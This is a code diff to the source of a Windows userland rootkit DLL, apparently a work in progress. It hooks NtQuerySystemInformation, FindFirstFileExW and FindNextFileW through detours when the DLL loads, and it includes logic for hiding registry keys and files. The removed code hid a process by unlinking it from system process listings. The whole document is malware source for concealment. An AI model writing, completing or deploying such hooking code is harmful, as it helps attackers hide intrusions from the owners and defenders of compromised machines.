@@ -15,6 +15,8 @@
 
 #include <shlwapi.h>
 #include <winsock2.h>
+#include "NtQuerySystemInformation.h"
+#include "GreenKit.h"
 
 #define REGKEY "SOFTWARE\\example\\example"
 #define REGKEY_VALUE "explorer"
@@ -37,9 +39,6 @@ VOID WriteFile(char token)
 
 typedef DWORD(NTAPI *elNtQuerySystemInformation)(DWORD i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
-
-elNtQuerySystemInformation oldNtQuery;
-elNtQuerySystemInformation hookNtQuery;
 
 typedef HANDLE(WINAPI *FFFEx)(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
 HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
@@ -68,7 +67,7 @@ typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
 TD_NtEnumerateKey oldNtEnumerateKey;
 TD_NtEnumerateKey hookNtEnumerateKey;
 
-typedef LONG (WINAPI *RtlCompareUnicodeString)(
+typedef LONG (WINAPI *TD_RtlCompareUnicodeString)(
     _In_ PCUNICODE_STRING String1,
     _In_ PCUNICODE_STRING String2,
     _In_ BOOLEAN          CaseInSensitive
@@ -78,6 +77,24 @@ typedef NTSTATUS(WINAPI * TD_RtlAnsiStringToUnicodeString)(
     _Inout_ PUNICODE_STRING DestinationString,
     _In_    PCANSI_STRING   SourceString,
     _In_    BOOLEAN         AllocateDestinationString
+    );
+
+typedef NTSTATUS(WINAPI * TD_RtlUniStringToAnsiString)(
+    _Inout_ PCANSI_STRING DestinationString,
+    _In_    PUNICODE_STRING   SourceString,
+    _In_    BOOLEAN         AllocateDestinationString
+    );
+
+typedef VOID(NTAPI *TD_RtlFreeAnsiString)(
+    PANSI_STRING AnsiString
+);
+
+typedef NTSTATUS(NTAPI *TD_NtClose)(
+    IN HANDLE Handle
+    );
+
+typedef VOID(NTAPI *TD_FreeAnsiString)(
+    PANSI_STRING AnsiString
     );
 
 BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
@@ -93,7 +110,7 @@ BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
 
     ansi_to_uni(&abc, &ansi_abc, TRUE);
 
-    RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
+    TD_RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
         (_In_ PCUNICODE_STRING String1,
         _In_ PCUNICODE_STRING String2,
         _In_ BOOLEAN          CaseInSensitive
@@ -117,7 +134,7 @@ BOOL mustHideReg(UNICODE_STRING uStr_reg) {
 
     ansi_to_uni(&abc, &ansi_abc, TRUE);
 
-    RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
+    TD_RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
         (_In_ PCUNICODE_STRING String1,
         _In_ PCUNICODE_STRING String2,
         _In_ BOOLEAN          CaseInSensitive
@@ -144,6 +161,45 @@ ULONG getKeyNameLength(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformatio
     return 0;
 }
 
+/* Return the name of the specified registrykey entry. */
+
+PVOID getKeyEntryName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass)
+{
+    PVOID pvResult = NULL;
+
+    switch (KeyInformationClass)
+    {
+    case KeyBasicInformation:
+        pvResult = (PVOID)&((PKEY_BASIC_INFORMATION)KeyInformation)->Name;
+        break;
+    case KeyNodeInformation:
+        pvResult = (PVOID)&((PKEY_NODE_INFORMATION)KeyInformation)->Name;
+        break;
+    }
+
+    return pvResult;
+}
+
+NTSTATUS WINAPI NewNtOpenFile(
+    PHANDLE				phFile,
+    ACCESS_MASK			DesiredAccess,
+    POBJECT_ATTRIBUTES	ObjectAttributes,
+    PIO_STATUS_BLOCK	IoStatusBlock,
+    ULONG				ShareAccess,
+    ULONG				OpenOptions)
+{
+    TCHAR sPath[MAX_PATH];
+    //DWORD dwRet;
+    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
+    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+
+    //if (!mustHideFile(*sPath))
+    //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
+
+    return 0;//status; // STATUS_NO_SUCH_FILE
+}
+
+/*
 NTSTATUS NTAPI NewNtEnumerateKey(
     HANDLE					KeyHandle,
     ULONG					Index,
@@ -207,7 +263,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
         }
     }
     return hookNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
-}
+}*/
 
 	BOOL APIENTRY DllMain(HMODULE hModule,
 		DWORD  ul_reason_for_call,
@@ -222,8 +278,8 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 		switch (ul_reason_for_call)
 		{
 		case DLL_PROCESS_ATTACH:
-			//oldNtQuery = (elNtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation");
-			//hookNtQuery = (elNtQuerySystemInformation)DetourFunction((PBYTE)oldNtQuery, (PBYTE)elNtQuery);
+            SetOldHookNtQuery((TD_NtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation"));
+            SetHookNtQuery((TD_NtQuerySystemInformation)DetourFunction((PBYTE)GetOldHookNtQuery(), (PBYTE)NewNtQuerySystemInformation));
 
 			oldFFFEx = (FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW");
 			hookFFFEx = (FFFEx)DetourFunction((PBYTE)oldFFFEx, (PBYTE)elFFFEx);
@@ -231,8 +287,8 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 			oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
 			hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);
 
-			oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
-			hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
+			//oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
+			//hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
 
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
@@ -241,62 +297,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 		}
 		return TRUE;
 	}
-	/*
-	DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
-	{
 
-	//MessageBox(0, "LISTING PROCESS CALLED", "HookTest", MB_OK | MB_ICONERROR);
-	SYSTEM_PROCESS_INFORMATION cur, prev;
-	char tmp[128];
-
-	DWORD r = hookNtQuery(i, SystemInformation, SystemInformationLength, ReturnLength);
-
-	if (i == SystemProcessInformation)
-	{
-	if (r == 0)
-	{
-	HKEY key;
-	DWORD size;
-	char exe[128];
-	RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);
-
-	RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);
-
-	RegCloseKey(key);
-
-	cur = prev = (SYSTEM_PROCESS_INFORMATION)SystemInformation;
-
-	while (1)
-	{
-	WideCharToMultiByte(CP_ACP, 0, cur->ProcessName.Buffer, -1, tmp, 128, NULL, NULL);
-
-	if (strcmp(tmp, "explorer.exe") == 0)
-	{
-	if (cur->NextEntryOffset == 0)
-	{
-	prev->NextEntryOffset = 0;
-	break;
-	}
-	else
-	{
-	prev->NextEntryOffset += cur->NextEntryOffset;
-	cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);
-	}
-	}
-
-	if (cur->NextEntryOffset == 0)
-	break;
-
-	prev = cur;
-	cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);
-
-	}
-	}
-	}
-
-	return 0;
-	}
-	*/
 	HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
 	{
 		HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
